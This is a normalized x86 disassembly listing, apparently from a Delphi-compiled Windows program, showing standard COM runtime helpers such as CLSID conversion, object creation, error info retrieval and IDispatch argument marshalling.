pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478ed3
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov ecx edi
mov edx esi
call sub_4784f0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_478edc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_478f50
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478f57
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov ecx edi
mov edx esi
call sub_478518
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_478f60
push ebx
mov ebx eax
cmp [ ebx + 0x3c ] 0x0
jle r-xdata
pop ebx
retn
dec [ ebx + 0x3c ]
mov [ ebx + 0x38 ] 0x0
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_42b634
mov edx [ ebx + 0x30 ]
mov edx [ edx + 0x8 ]
dec edx
cmp eax edx
jge r-xdata
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_42b6a4
mov edx [ ebx + 0x34 ]
mov eax [ ebx + 0x30 ]
call sub_42b5cc
xor eax eax
mov [ ebx + 0x34 ] eax
sub_478fcc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_479033
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47903a
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov edx esi
call sub_478544
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_479040
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47859c
xor eax eax
push ebp
push sub_4790a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478fc4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4790ae
mov eax [ ebp - 0x4 ]
call sub_478f60
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_478fb0
mov edx esi
call sub_478560
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4790b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4790d9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4790e0
retn
sub_479118
push 0xd1004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch dl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_479165
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47916c
retn
sub_4792e4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403ff8
mov eax [ ebx ]
call sub_408a04
mov esi eax
jmp r-xdata
mov eax [ ebx ]
call sub_404264
test eax eax
jle r-xdata
pop esi
pop ebx
retn
mov al [ esi ]
sub al 0x21
jb r-xdata
mov eax [ ebx ]
call sub_404464
mov edx esi
sub edx eax
mov eax ebx
call sub_4045f0
mov eax [ ebx ]
call sub_408a04
mov esi eax
sub al 0xd
je r-xdata
sub_479334
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_4793db
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_40403c
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403578
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_40bdb4
mov [ ebx + 0xc ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4793e2
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fc8
retn
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b414
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_4092d0
sub_4793e2
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_479404
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_479476
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4792e4
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax edi
call sub_479334
lea eax [ edi + 0x10 ]
mov edx [ ebp + 0x10 ]
call sub_403ff8
lea eax [ edi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_403ff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47947d
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
add esp 0xfffffff0
call sub_403578
sub_47947d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4794d0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call StringFromCLSID
call sub_4794b8
mov eax esi
mov edx [ esp ]
call sub_4041cc
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_4794fc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call ProgIDFromCLSID
call sub_4794b8
mov eax esi
mov edx [ esp ]
call sub_4041cc
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_479528
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_405a08
push eax
push r-xdata
push 0x5
push 0x0
push ebx
call CoCreateInstance
call sub_4794b8
pop esi
pop ebx
retn
sub_479560
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x48 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_40493c
xor eax eax
push ebp
push sub_4796a4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c68
mov eax ebx
call sub_40480c
mov [ ebp - 0x1c ] eax
push esi
push edi
mov esi r-xdata
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
call sub_405a08
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_40481c
test eax eax
jle r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
mov ebx 0x15
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call GetComputerNameA
test eax eax
je r-xdata
mov ebx 0x10
jmp r-xdata
lea eax [ ebp - 0x44 ]
mov edx ebx
call sub_40422c
mov eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov ecx 0x10
call sub_404214
mov eax [ ebp - 0x48 ]
pop edx
call sub_408298
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x0
push esi
call [ rw-data ]
call sub_4794b8
mov eax [ ebp - 0x8 ]
call sub_4794b8
mov eax edi
mov edx [ ebp - 0xc ]
call sub_405a20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4796ab
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_403fc8
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_404a0c
retn
mov ebx 0x15
jmp r-xdata
sub_4796c4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_479750
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebx ] eax
lea eax [ ebp - 0x8 ]
call sub_405a08
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_417ae4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479757
lea eax [ ebp - 0xc ]
call sub_405a08
lea eax [ ebp - 0x8 ]
call sub_405a08
retn
lea eax [ ebp - 0xc ]
call sub_405a08
push eax
push edi
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_417ae4
test al al
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_479770
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_479802
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479809
lea eax [ ebp - 0x8 ]
call sub_405a08
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
lea eax [ ebp - 0x4 ]
call sub_405a08
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_417ae4
test al al
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_405a08
push eax
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_417ae4
test al al
je r-xdata
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_417ae4
test al al
je r-xdata
xor eax eax
mov [ ebx ] eax
sub_479820
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_479922
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_479a14
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
call sub_405a08
push eax
push 0x0
call GetErrorInfo
test eax eax
jne r-xdata
push esi
push ebx
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_40422c
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
call sub_40422c
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_40422c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_479404
jmp sub_4039e0
lea eax [ ebp - 0x8 ]
call sub_4046b0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
lea eax [ ebp - 0xc ]
call sub_4046b0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_4046b0
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_4799e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479a1b
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fc8
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4046c8
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
sub_479a24
push ebp
mov ebp esp
add esp 0xfffff9b0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_40493c
xor eax eax
push ebp
push sub_479d57
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
push ebp
push sub_479d34
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx edi [ esi + 0x1 ]
cmp edi 0x40
jle r-xdata
test edi edi
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
lea eax [ ebp - 0x650 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edi
xor eax eax
mov al [ esi + 0x2 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax edi
add eax eax
lea eax [ ebp + eax * 8 - 0x650 ]
mov [ ebp - 0x18 ] eax
xor ebx ebx
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x650 ]
and ecx 0xfff
cmp ecx 0x9
jne r-xdata
cmp [ ebp - 0xc ] 0x48
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x18 ]
mov [ eax + 0x8 ] 0x80020004
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x50 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0xfffffffd
sub [ ebp - 0x2c ] 0x4
inc [ ebp - 0x24 ]
jmp r-xdata
mov eax 0x8
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
lea edx [ ebp + edx * 8 - 0x250 ]
mov [ ebp - 0x1c ] edx
test al al
je r-xdata
inc ebx
cmp edi ebx
jne r-xdata
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x50 ]
call sub_47a004
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_404dcc
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x1c ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
call sub_404dcc
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x4008
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x18 ] 0x10
mov al [ esi + ebx + 0x3 ]
mov edx eax
and dl 0x7f
and edx 0xff
mov [ ebp - 0xc ] edx
and al 0x80
cmp [ ebp - 0xc ] 0xa
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479d3b
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x250 ]
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov eax 0x3
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0xc ] 0x5
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp - 0xc ]
or eax 0x4000
mov edx [ ebp - 0x18 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
add [ ebp - 0x14 ] 0x4
inc [ ebp - 0x10 ]
jmp r-xdata
retn
dec ebx
mov eax [ ebp + ebx * 8 - 0x250 ]
push eax
call SysFreeString
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov ecx [ eax ]
mov eax edx
mov edx eax
mov eax ecx
call sub_404da8
cmp [ ebp - 0xc ] 0x7
jg r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
add [ ebp - 0x14 ] 0xc
jmp r-xdata
mov eax [ ebp - 0x10 ]
lea eax [ ebp + eax * 8 - 0x250 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
call sub_404dcc
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x20 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
inc [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov ecx 0x8
call sub_40fdbc
add [ ebp - 0x14 ] 0x4
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
sub_479d68
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
pop ecx
pop ecx
pop ebp
retn
sub_479d9c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp - 0x4 ]
xor edi edi
mov [ ebp - 0x8 ] esp
mov eax [ ebp - 0xc ]
inc eax
shl eax 0x2
sub esp eax
lea eax [ ebp - 0x10 ]
mov [ eax ] esp
mov eax [ ebp - 0xc ]
sub eax edi
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_408bb4
mov esi eax
push 0x0
push 0x0
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax eax
add eax 0x3
and eax 0xfffffffc
sub esp eax
lea eax [ ebp - 0x18 ]
mov [ eax ] esp
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetThreadLocale
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp eax 0x80020006
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov [ eax + edx * 2 - 0x2 ] 0x0
inc esi
add ebx esi
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
call sub_4794b8
push ebp
call sub_479d68
pop ecx
jmp r-xdata
mov esp [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_479e94
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1 ] 0x40
jbe r-xdata
mov dx [ eax ]
cmp dx 0x9
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
cmp dx 0x4009
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_479e7c
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
xor ecx ecx
mov cl [ ebx + 0x2 ]
inc ecx
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebx + eax + 0x3 ]
mov eax [ ebp - 0x4 ]
call sub_479d9c
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push esi
lea ecx [ ebp - 0x104 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_479a24
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_40f550
sub_479f30
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_479ff5
push [ fs : edx ]
mov [ fs : edx ] esp
cmp eax 0x80020009
jne r-xdata
push eax
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_479334
mov esi eax
mov eax [ ebx + 0x1c ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x4 ]
call sub_40422c
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0xc ]
call sub_40422c
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x8 ]
call sub_40422c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_479404
mov esi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479ffc
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fc8
retn
push [ ebp - 0x4 ]
mov eax esi
jmp sub_4039e0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_404b44
jmp r-xdata
sub_47a020
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
xor edx edx
mov edi esp
movzx ecx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] esp
movzx eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add ebx 0x3
mov esi [ ebp + 0x18 ]
movzx ecx [ ebx ]
cmp ecx 0x4
jne r-xdata
mov esi [ ebp + 0x14 ]
and al 0x7f
or eax 0x4000
cmp al 0xc
je r-xdata
mov [ ebp - 0xc ] esp
push edx
lea eax [ ebp - 0x30 ]
push eax
push ecx
push edx
call sub_47a010
pop edx
pop ecx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
push rw-data
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
push 0xfffffffd
inc [ ebp - 0x4 ]
cmp [ ebx + 0x3 ] 0x9
je r-xdata
push [ esi + eax * 4 - 0x4 ]
dec eax
jne r-xdata
movzx eax [ ebx ]
test al 0x80
jne r-xdata
mov ebx [ ebp + 0xc ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
add esi 0x10
jmp r-xdata
cmp al 0x5
jb r-xdata
mov esp edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp - 0x30 ]
mov cl 0x1
push ecx
mov ecx [ ebp + 0x4 ]
jmp sub_479f30
mov ecx 0x8
cmp [ ebx + 0x3 ] 0xd
jne r-xdata
inc ebx
dec ecx
jne r-xdata
push edx
push [ esi ]
push edx
push eax
add esi 0x4
cmp al 0x7
ja r-xdata
push [ esi + 0x4 ]
push [ esi ]
push edx
push eax
add esi 0x8
jmp r-xdata
sub_47a104
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax esp
push eax
lea eax [ ebp + 0x14 ]
push eax
push eax
push [ ebx ]
lea eax [ ebx + 0x5 ]
push eax
push [ ebp + 0xc ]
call sub_47a020
movzx eax [ ebx + 0x4 ]
mov ebx [ ebp + 0x8 ]
jmp [ eax * 4 + jump_table_47a135 ]
fld [ esp + 0x8 ]
jmp r-xdata
fld [ esp + 0x8 ]
jmp r-xdata
fild [ esp + 0x8 ]
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax ebx
call sub_40f550
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
pop ebp
retn
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
call SysFreeString
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
mov eax [ eax ]
